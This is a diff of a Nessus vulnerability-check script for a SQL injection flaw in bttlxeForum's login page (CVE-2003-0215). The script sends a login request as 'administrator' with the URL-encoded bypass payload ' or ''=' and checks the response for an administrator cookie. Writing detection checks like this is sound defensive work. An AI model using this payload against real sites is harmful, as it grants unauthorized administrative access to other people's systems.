@@ -10,8 +10,9 @@
 if(description)
 {
  script_id(11548);
- script_version("$Revision: 1.3 $");
- script_cve_id("CAN-2003-0215");
+ script_version("$Revision: 1.13 $");
+ script_bugtraq_id(7416);
+ script_cve_id("CVE-2003-0215");
 
  script_name(english:"bttlxeForum SQL injection");
  desc["english"] = "
@@ -26,7 +27,7 @@ making the webmaster legally liable for the impersonations) or gain the control
 of the remote SQL database
 
 Solution : http://www.battleaxesoftware.com/forums/forum.asp?forumid=36&select=1812
-Risk Factor : High";
+Risk factor : High";
  
  script_description(english:desc["english"]);
  script_summary(english:"Uses a SQL query as a password");
@@ -35,6 +36,7 @@ Risk Factor : High";
  script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
 }
 
@@ -42,16 +44,17 @@ Risk Factor : High";
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port) port = 80;
-if(!get_port_state(port))exit(0);
+port = get_http_port(default:80);
+if ( ! can_host_asp(port:port) ) exit(0);
 
-dirs = make_list(cgi_dirs(), "/forum", "/bttlxe", "");
 
-foreach d (dirs)
+foreach d (cgi_dirs())
 {
+ if ( is_cgi_installed_ka(item:d + "/myaccount/login.asp", port:port) )
+ {
  req = http_post(item:d + "/myaccount/login.asp", port:port);
  idx = stridx(req, string("\r\n\r\n"));
+ data = "userid=administrator&password=+%27or%27%27%3D%27+&cookielogin=cookielogin&Submit=Log+In";
 
  req = string("POST ", d, "/myaccount/login.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), "\r\n",
@@ -59,16 +62,17 @@ foreach d (dirs)
 "Accept: */*\r\n",
 "Referer: http://", get_host_name(), d, "/myaccount/login.asp\r\n",
 "Content-Type: application/x-www-form-urlencoded\r\n",
-"Content-Length: 87\r\n\r\n",
-"userid=administrator&password=+%27or%27%27%3D%27+&cookielogin=cookielogin&Submit=Log+InN");
+"Content-Length: ", strlen(data), "\r\n\r\n", data);
+
 
 
  res = http_keepalive_send_recv(port:port, data:req);
  if( res == NULL ) exit(0);
 
  if("Set-Cookie: ForumMemberLevel=Administrator" >< res)
- {
+  {
    security_hole(port);
    exit(0);
+  }
  }
 }
